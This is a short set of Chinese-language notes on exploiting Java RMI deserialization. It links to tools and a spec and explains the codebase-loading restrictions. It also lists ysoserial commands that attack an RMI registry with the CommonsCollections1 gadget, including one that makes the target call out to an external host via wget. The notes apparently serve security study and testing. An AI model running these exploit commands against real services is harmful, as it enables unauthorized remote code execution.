[转储和重建 Java 序列化流和 Java RMI 数据包内容的工具](https://github.com/NickstaDB/SerializationDumper)

[用于枚举和攻击Java RMI（远程方法调用）服务的工具](https://github.com/NickstaDB/BaRMIe?tab=readme-ov-file)

[JAVA反序列化文档](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html)

https://paper.seebug.org/1091/

- 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
- 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性

yso常用命令：

```
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 calc.exe

java -cp ysoserial-all.jar ysoserial.payloads.JRMPClient 127.0.0.1 1099 CommonsCollections1 calc.exe

java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 80 CommonsCollections1 "wget rmiyso.bit.0y0.link"
```

java 8 update 121进行了限制
